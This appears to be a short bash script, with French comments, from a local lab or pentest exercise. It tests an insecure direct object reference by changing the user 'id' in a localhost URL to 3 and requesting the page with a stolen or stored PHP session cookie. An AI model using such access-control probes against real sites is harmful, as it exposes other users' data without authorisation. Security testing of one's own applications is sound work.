#!/bin/bash

# Lire les informations de session depuis session_info.txt
PHPSESSID=$(head -n 1 session_info.txt)
USER_ID=$(tail -n 1 session_info.txt)

# Assurez-vous que les variables ne sont pas vides
if [ -z "$PHPSESSID" ] || [ -z "$USER_ID" ]; then
    echo "Failed to retrieve session information."
    exit 1
fi

# A changer
BASE_URL="http://localhost:2024/pages/user/user_page.php?"

# Construire l'URL initiale avec USER_ID
INITIAL_URL="$BASE_URL?id=$USER_ID"

# Modifier le paramètre `id` dans l'URL (exemple : id=1 -> id=2)
MODIFIED_URL=$(echo "$INITIAL_URL" | sed 's/id=[0-9]\+/id=3/')

echo "Initial URL: $INITIAL_URL"
echo "Modified URL: $MODIFIED_URL"

# Envoyer une requête avec la nouvelle URL et le cookie
response=$(curl -i -L -X POST "$MODIFIED_URL" \
    -b "PHPSESSID=$PHPSESSID" \
    )

# Vérifier le statut HTTP et afficher la réponse
echo "----------------------------------------"
if echo "$response" | grep -q "200 OK"; then
    echo "URL modified"
    sed -i '2s/.*/3/' session_info.txt

echo "----------------------------------------"
    curl "$MODIFIED_URL"
else
    echo "Failed to modified URL."
fi
echo "----------------------------------------"
